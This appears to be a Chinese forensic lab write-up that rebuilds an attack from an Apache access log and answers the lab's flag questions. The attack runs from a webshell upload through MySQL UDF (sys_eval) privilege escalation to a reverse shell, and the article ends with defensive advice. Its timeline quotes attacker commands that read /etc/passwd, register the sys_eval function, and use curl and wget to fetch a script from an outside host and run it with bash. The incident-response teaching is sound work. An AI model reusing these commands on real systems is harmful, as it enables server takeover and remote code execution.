---
title: 实战复盘  如何通过 Apache 日志还原黑客的攻击链路？
url: https://mp.weixin.qq.com/s/lGvfRXZEcfkmo1gnCcLXWw
source: Doonsec's feed
date: 2026-04-26
fetch_date: 2026-04-27T05:02:52.789003
---

# 实战复盘  如何通过 Apache 日志还原黑客的攻击链路？

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/wIGVBqrREoaDiaC5y3zLHx45UEADo93x7Maicr0Lt2kEvXxYaRacoA1qmicRweLDBlM6gfPjhRQZGaJ6SNylNDJ9ZQJhMj8GUV9EHkg8Ad0FsA/0?wx_fmt=jpeg)

# 实战复盘 如何通过 Apache 日志还原黑客的攻击链路？

原创

SKillLab
SKillLab

SkillLab

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

![](https://mmbiz.qpic.cn/sz_mmbiz_png/giaH4bTW3BOn7HPhfCMVxA0xejnkZnrB7IzGmjhJgJiaZOqicg7CFjrT9RpRjGhAgRjQmzq3mxicx4Omb2qFBFLP4Q/640)

![](https://mmbiz.qpic.cn/mmbiz_png/yE70PlBSEozVzTlePtQiashoYBKamZxNpJ51KxAQrTo1uNYOmLQxWs5GWialAxToZvVxIm7ic31Bw4WEM8icL4dDog/640)

本文内容仅用于 **OSCP 备考交流**

互联网不是法外之地，请严格遵守《网络安全法》

![](https://mmbiz.qpic.cn/sz_mmbiz_png/0R0gH979OQm5DPYX5ibxXe5qQhhHPuj3jWWRNSfSJ4IRal5yNkjTjcDVezJ3y6xzHYqlVUhwTW1HvqX5CFzmlOg/640)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/qDqAuCnIXITRGeD5aouLKbXRJia0uSyY5EPCes7mMPeKNc22Tv4trYWibW7ta9xujbnmSBa04z1kIyFd65Fa6GqA/640)

01

前言

在接到主机失陷的告警后，应急响应人员的第一直觉至关重要。面对一台已经“沦陷”的服务器，我们通常需要执行“溯源三问”：

怎么进来的？（入口点：弱口令、Web漏洞、RCE等）

留下了什么？（线索：异常进程、日志、后门文件）

拿到了什么？（权限：Web用户、数据库用户、还是Root？）

本文将通过对/var/log/apache2/access.log的深度分析，复原一场从Webshell上传到MySQL UDF提权的完整攻击链路。

02

攻击时间线还原（2023年8月1日）

|  |  |  |
| --- | --- | --- |
| 时间 | 操作 | 目的 |
| 02:02:31 | 上传sh.php文件 | 上传webshell，对服务器进行控制。 |
| 02:08:20 | 最后一次访问 sh.php文件 | 可能是上传Webshell或试探 |
| 02:09:04 | 执行 select version() | 查看数据库版本 |
| 02:09:47 | 执行 select load\_file("/etc/passwd") | 读取系统敏感文件 |
| 02:11:07 | 执行 show variables like '%plugin%' | 查找MySQL插件目录位置 |
| 02:11:20 | 执行 select \* from func | 检查是否已存在恶意函数 |
| 02:11:33 | 再次执行 select \* from func | 确认函数表状态 |
| 02:12:54 | 执行 create function sys\_eval ... soname 'mysqludf.so' | 创建 sys\_eval 恶意函数 |
| 02:13:00 | 执行 select sys\_eval('whoami') | 首次调用 sys\_eval，探测当前用户身份 |
| 02:13:08 | 再次查询 func表 | 确认函数已成功注册 |
| 02:13:18 | 再次执行 sys\_eval('whoami') | 验证函数功能稳定 |
| 02:13:53 | 执行 sys\_eval('curl 192.168.100.13:771') | 尝试通过curl与外部C2服务器通信 |
| 02:14:11 | 执行 sys\_eval('wget 192.168.100.13:771') | 尝试通过wget下载文件 |
| 02:16:31 | 执行 sys\_eval('wget -o /tmp/1.sh 192.168.100.13:771/1.sh') | 下载恶意脚本到 /tmp 目录 |
| 02:16:35 | 再次尝试下载（换端口777） | 备用下载通道 |
| 02:16:43 | 执行 sys\_eval('ls /tmp/') | 确认脚本已下载成功 |
| 02:16:57 | 执行 sys\_eval('bash /tmp/1.sh') | 执行下载的恶意脚本 |
| 02:17:09 | 再次访问 sh.php | 维持连接 |
| 02:17:37 | 执行 sys\_eval('ls -la /tmp/') | 确认脚本权限和执行状态 |
| 02:18:18 | 执行 Base64 解码命令（反弹Shell命令解码测试） | 准备反弹Shell payload |
| 02:18:27 | 将反弹Shell命令写入 /tmp/1.sh | 部署反弹Shell脚本 |
| 02:18:37 | 执行 ls -la /tmp/1.sh | 确认脚本写入成功 |
| 02:19:07 | 执行 bash /tmp/1.sh | 执行反弹Shell，建立远程控制通道 |

根据时间线，我们可以集中回答靶机中的4个问题。

03

靶机问题复盘(Flag详解)

1.黑客第一次写入的shellflag{关键字符串}

通过日志发现，攻击者频繁访问/sh.php。在进入Web目录查看后，确认其内容为一句话木马：

```
cat sh.php
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/wIGVBqrREoYG31z6XzE0C1NA72YhVQ8IGOQLbf4a04Ec7z4qxn3VKv43uxgvPqkOrs5elyLCxkuLPmJrWaZyFXuJshfE4ewc859utwrPfRc/640?wx_fmt=other&from=appmsg)

2.黑客反弹shell的ipflag{ip}

在日志中我们可以看到攻击者向/tmp/1.sh文件中写入了反弹shell并执行。

![](https://mmbiz.qpic.cn/mmbiz_jpg/wIGVBqrREoacicf8hxl33dicLP8Kia9Q4RSyC6LUSbLdRnTUTSj1QBpRnUzp1bt7OBeANTjZzcEX3icPqwsiapl0eBZRoAWPmWqBicCk4Y7WO3E6s/640?wx_fmt=other&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/wIGVBqrREoZrJXeNxMXnHoAeKoMZTjYhMX2E1MqsUhVEAfYwgE3QNdRkvm6dr6Jia7WrTwQXvw5pyswmfZPAdhQDsO3LHY2n3iaKiaHYOv93HE/640?wx_fmt=other&from=appmsg)

```
ccfda79e-7aa1-4275-bc26-a6189eb9a20b
```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/wIGVBqrREoY5hB0xibJIaFTngrlWibF5KmK6KKQvsQZgA2P4wbfsribAXsRQqnnVTf6kTozibl4XrNElughwrrEibgOPLDDibk5ZePfK2FicV03G1A/640?wx_fmt=other&from=appmsg)

3.黑客提权文件的完整路径md5 flag{md5}注/xxx/xxx/xxx/xxx/xxx.xx

攻击者通过MySQL提权时，加载了一个二进制动态链接库文件。日志显示其在02:11:07查找了插件目录，并在02:12:54加载了mysqludf.so。

根据MySQL的默认规范，该文件通常位于/usr/lib/mysql/plugin/（需根据实际系统环境确认）。

![](https://mmbiz.qpic.cn/mmbiz_jpg/wIGVBqrREobBNKufANbOMxFW0aEnXnLEI63qe4wJGWAGcaEHvEMht7mzFSJAoeHu6FFVwm2ATkNRBtvJz1rhEnoez1F6wLYmWs3iczrHEjHE/640?wx_fmt=other&from=appmsg)

```
md5sum /usr/lib/mysql/plugin/mysqludf.so
```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/wIGVBqrREoaOicic1hd05UUxlSo0bmKayFNqBVhhzl2eKrdjEEkx7TTTESOiaiarf9hia7gIpibjpshjm0YkHfMMQJWRYD8xiaicScGFCVxwQicFhkoE/640?wx_fmt=other&from=appmsg)

4.黑客获取的权限flag{whoami后的值}

攻击者在注册sys\_eval函数后，立即执行了whoami

数据库提权获取的权限取决于数据库服务的启动用户，通过ps -aux发现，MySQL以mysql用户权限运行。

```
ps -aux
```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/wIGVBqrREoYGjlUgc0OTBIWjQxNvmYosx1BNxEiatapazkJBtwbkI55vfL7nySwMJlZiaCQgfZ8JS2FcL2WicwPWVWU6CQmkys29jkhaICCkv0/640?wx_fmt=other&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/wIGVBqrREoavicNo9cVRiaibVP7WfmyKnvL1UbJWQ7nFD3hhDDuqzmJsf0r1QDw5DoibP2llQmfFMBKJrVanQxYSjwXuDFAQojFpv4RCTrv0WQs/640?wx_fmt=other&from=appmsg)

04

总结与防御建议

1.Web层面：应加强文件上传目录的权限控制，取消目录执行权限并部署WAF。

2.数据库层面：数据库应遵循最小权限原则运行，禁用高危函数，并严格限制plugin目录的写权限。

3.系统层面：监控/tmp等敏感目录的异常脚本执行行为。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/icm4ChVndamFMq6SvSQ198icGFvO95e1w2hyPynxE0A6tWibxnWHasd6pcLddg54FWasFcmV1vc44eAXSkCvIK3mw/0?wx_fmt=png)

SkillLab

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/icm4ChVndamFMq6SvSQ198icGFvO95e1w2hyPynxE0A6tWibxnWHasd6pcLddg54FWasFcmV1vc44eAXSkCvIK3mw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过